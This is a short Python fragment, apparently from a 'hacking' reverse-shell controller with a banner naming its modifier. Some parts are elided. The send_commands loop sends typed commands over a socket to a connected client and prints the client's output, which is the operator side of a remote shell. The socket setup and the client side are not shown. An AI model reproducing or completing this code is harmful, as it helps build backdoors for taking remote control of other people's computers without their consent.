...
def send_commands(conn):
     while True: # infinite loop for connection to stay constant
          ...
          if len(str.encode(cmd)) > 0:
              # check that the command is not empty, otherwise do not send across network
              conn.send(str.encode(cmd))
              client_response = str(conn.recv(1024).decode( "utf-8")) # 1024 is buffer size, utf-8 to convert to normal string
              print(client_response, end="") # default end = '\n', change it to '' so don't give new line at the end 

def main():
     x="GASA HACKING...\n MODIFIED BY GASBAOUI MOHAMMED AL AMINE \n"
     os.system("clear || cls")
     print ( x, end="")
